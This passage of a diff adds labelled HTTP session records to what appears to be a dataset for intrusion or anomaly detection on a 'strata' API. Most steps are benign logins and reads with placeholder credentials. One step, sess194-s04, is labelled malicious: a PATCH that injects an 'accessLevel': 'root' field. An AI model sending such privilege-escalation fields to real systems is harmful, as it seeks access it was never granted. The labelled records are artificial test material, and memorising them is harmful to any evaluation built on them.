+        "id": "sess190-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-9002",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token190"
+        },
+        "body": null,
+        "note": "The user returns to stratum 9002."
+      }
+    ]
+  },
+  {
+    "session_id": "sess191",
+    "client_ip": "192.0.2.100",
+    "steps": [
+      {
+        "id": "sess191-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "manasseh",
+          "password": "secretpassword91"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess191-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token191"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess191-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-9101",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token191"
+        },
+        "body": null,
+        "note": "The user opens stratum 9101."
+      },
+      {
+        "id": "sess191-s04",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-9999",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token191"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. Words in the id are not evidence the object belongs to someone else."
+      },
+      {
+        "id": "sess191-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-9102",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token191"
+        },
+        "body": null,
+        "note": "The user returns to another previously used artifact object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess192",
+    "client_ip": "192.0.2.101",
+    "steps": [
+      {
+        "id": "sess192-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "caleb",
+          "password": "secretpassword92"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess192-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token192"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess192-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-9201",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token192"
+        },
+        "body": null,
+        "note": "The user opens stratum 9201."
+      },
+      {
+        "id": "sess192-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-9202",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token192"
+        },
+        "body": null,
+        "note": "The user returns to stratum 9202."
+      }
+    ]
+  },
+  {
+    "session_id": "sess193",
+    "client_ip": "192.0.2.102",
+    "steps": [
+      {
+        "id": "sess193-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "joshua",
+          "password": "secretpassword93",
+          "sessionNote": "Active session."
+        },
+        "note": "The request body contains a technical word in a sessionNote field."
+      },
+      {
+        "id": "sess193-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token193"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess193-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-9301",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token193"
+        },
+        "body": null,
+        "note": "The user opens stratum 9301."
+      },
+      {
+        "id": "sess193-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-9302",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token193"
+        },
+        "body": null,
+        "note": "The user returns to stratum 9302."
+      }
+    ]
+  },
+  {
+    "session_id": "sess194",
+    "client_ip": "192.0.2.103",
+    "steps": [
+      {
+        "id": "sess194-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "gideon",
+          "password": "secretpassword94"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess194-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token194"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess194-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-9401",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token194"
+        },
+        "body": null,
+        "note": "The user opens stratum 9401."
+      },
+      {
+        "id": "sess194-s04",
+        "label": "malicious",
+        "method": "PATCH",
+        "path": "/strata/stratum-9401",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token194",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 1.7,
+          "soilConsistency": "clay",
+          "accessLevel": "root"
+        },
+        "note": "The update body includes a privilege field not in the contract."
+      },
+      {
+        "id": "sess194-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-9402",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token194"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess195",
+    "client_ip": "192.0.2.104",
+    "steps": [
+      {
+        "id": "sess195-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "samson",
+          "password": "secretpassword95"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess195-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token195"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess195-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-9501",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token195"
+        },
+        "body": null,
+        "note": "The user opens stratum 9501."
+      },
+      {
+        "id": "sess195-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-9502",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token195"
+        },
+        "body": null,
+        "note": "The user returns to stratum 9502."
+      }
+    ]
+  }
+]
